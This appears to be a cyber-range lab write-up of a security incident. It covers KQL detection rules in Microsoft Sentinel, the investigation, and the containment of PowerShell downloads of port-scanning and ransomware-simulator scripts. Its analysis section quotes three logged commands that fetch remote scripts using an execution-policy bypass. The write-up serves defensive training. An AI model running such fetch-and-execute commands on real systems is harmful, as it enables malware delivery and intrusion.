# Scenario 2: PowerShell Suspicious Web Request


**Platform:** Microsoft Sentinel + Microsoft Defender for Endpoint  
**Status:** Closed — True Positive

---

## Objective
Detect PowerShell abuse via `Invoke-WebRequest` to download malicious scripts from the internet, investigate scope and impact, and respond following the NIST 800-61 Incident Response Lifecycle.

---

## Part 1: Alert Rule — KQL Query

Created a Scheduled Query Rule in Sentinel to detect PowerShell using `Invoke-WebRequest` to download remote content:

```kql
DeviceProcessEvents
| where InitiatingProcessCommandLine contains "invoke-web"
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated desc
```

---

## Part 2: Detection & Analysis

The incident triggered on **1 device** (`windows-target-1`) by **1 user**. The following PowerShell commands were discovered, downloading three scripts from a public GitHub repository with `-ExecutionPolicy Bypass`:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
```

The following query confirmed each script was executed **6 times** by the same account:

```kql
let scripts = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (scripts)
| project TimeGenerated, FileName, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated desc
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```
<img width="1907" height="807" alt="has the scripts been ran" src="https://github.com/user-attachments/assets/9ab8da09-6b7d-46a8-a1ae-cba65c95cd39" />



---

## Script Analysis

Scripts were passed to the malware reverse engineering team for analysis:

**eicar.ps1** — Creates a standard EICAR antivirus test file at `C:\ProgramData\EICAR.txt`. Used to probe whether AV detection is active on the host.

**portscan.ps1** — Scans the internal IP range `10.0.0.155–200` across 27 common ports (RDP, SSH, SMB, HTTP, etc.) using `Test-NetConnection`. Logs results to `entropygorilla.log`. Indicative of internal network reconnaissance following initial access.

**pwncrypt.ps1** — Ransomware simulator. Targets a random user's Desktop, creates fake sensitive files (employee records, financials, project data), encrypts them with AES-256, and drops a ransom note demanding $300 in Bitcoin. Logs all activity to `entropygorilla.log`.

**Attack Chain:** Download → AV evasion test (eicar) → Internal reconnaissance (portscan) → Encryption and extortion (pwncrypt). Full post-exploitation playbook.

---

## Containment, Eradication & Recovery

- Device isolated via Microsoft Defender for Endpoint
- Antivirus scan executed on the affected machine
- All three scripts were hashed and deleted from the host
- Domains used to download the scripts blocked internally and externally

---

## Post-Incident Activities

- Affected user enrolled in mandatory cybersecurity awareness training via KnowBe4
- Increased monitoring placed on affected account and device
- New policy created restricting PowerShell access for non-essential users

---

## Closure

Incident closed as **True Positive**. Three malicious scripts were downloaded and executed via PowerShell `Invoke-WebRequest`. Full containment and eradication completed. Policy and training controls implemented to prevent recurrence.
